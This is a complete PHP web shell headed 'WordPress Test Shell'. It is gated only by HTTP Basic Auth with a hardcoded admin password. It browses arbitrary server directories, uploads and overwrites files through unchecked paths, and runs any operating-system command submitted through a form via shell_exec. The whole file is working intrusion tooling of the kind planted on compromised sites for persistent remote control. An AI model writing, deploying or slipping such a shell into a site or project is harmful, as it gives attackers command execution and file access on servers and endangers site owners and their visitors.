<?php
session_start();

// Define credentials
$username = "admin";
$password = "AsterISK";

// Check if credentials were submitted via HTTP Basic Auth
if (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
    if ($_SERVER['PHP_AUTH_USER'] === $username && $_SERVER['PHP_AUTH_PW'] === $password) {
        $_SESSION['logged_in'] = true;
    }
}

// Enforce authentication before any content or headers are processed
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    header('WWW-Authenticate: Basic realm="Restricted Access"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authentication Required.';
    exit;
}

// Function to list directory contents
function list_directory($path) {
    $files = scandir($path);
    echo "<ul>";
    foreach ($files as $file) {
        if ($file != "." && $file != "..") {
            $filePath = $path . '/' . $file;
            $isDir = is_dir($filePath);
            echo "<li><a href='?dir=" . urlencode($filePath) . "'>" . htmlspecialchars($file) . "</a> " . ($isDir ? "(Directory)" : "(File)") . "</li>";
        }
    }
    echo "</ul>";
}

// Function to upload files
function handle_file_upload($uploadPath) {
    if (isset($_FILES['uploaded_file'])) {
        $file = $_FILES['uploaded_file'];
        $target_path = $uploadPath . '/' . basename($file['name']);
        if (move_uploaded_file($file['tmp_name'], $target_path)) {
            echo "<p style='color: green;'>File uploaded successfully.</p>";
        } else {
            echo "<p style='color: red;'>Error uploading file.</p>";
        }
    }
}

// Function to edit files
function handle_file_edit($filePath) {
    if (isset($_POST['edit_content'])) {
        file_put_contents($filePath, $_POST['edit_content']);
        echo "<p style='color: green;'>File saved successfully.</p>";
    }
}

// Handle directory changes safely
if (isset($_GET['dir'])) {
    $current_dir = $_GET['dir'];
} else {
    $current_dir = getcwd();
}

// Handle form submissions
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_FILES['uploaded_file']['name'])) {
        handle_file_upload($current_dir);
    } elseif (isset($_POST['edit_content']) && isset($_GET['file'])) {
        handle_file_edit($current_dir . '/' . $_GET['file']);
    }
}

// Output the interface
echo "<h1>WordPress Test Shell</h1>";
echo "<h3>Current Working Directory: " . htmlspecialchars($current_dir) . "</h3>";

echo "<fieldset><legend>Upload File</legend>";
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='uploaded_file' /> ";
echo "<input type='submit' value='Upload File' />";
echo "</form>";
echo "</fieldset><br>";

echo "<fieldset><legend>Edit File</legend>";
echo "<form method='post'>";
echo "<textarea name='edit_content' rows='10' cols='80'></textarea><br>";
echo "<input type='submit' value='Save/Edit File' />";
echo "</form>";
echo "</fieldset><br>";

if (is_dir($current_dir)) {
    echo "<h2>Directory Listing:</h2>";
    list_directory($current_dir);
}

// Terminal functionality
if (!empty($_POST['command'])) {
    // Note: shell_exec outputs raw text, use pre tags for formatting
    $output = shell_exec($_POST['command']);
    echo "<h2>Execution Output:</h2>";
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

echo "<fieldset><legend>Execute Command</legend>";
echo "<form method='post'>";
echo "<input type='text' name='command' style='width: 70%;' placeholder='Enter command...' /> ";
echo "<input type='submit' value='Execute' />";
echo "</form>";
echo "</fieldset>";
?>
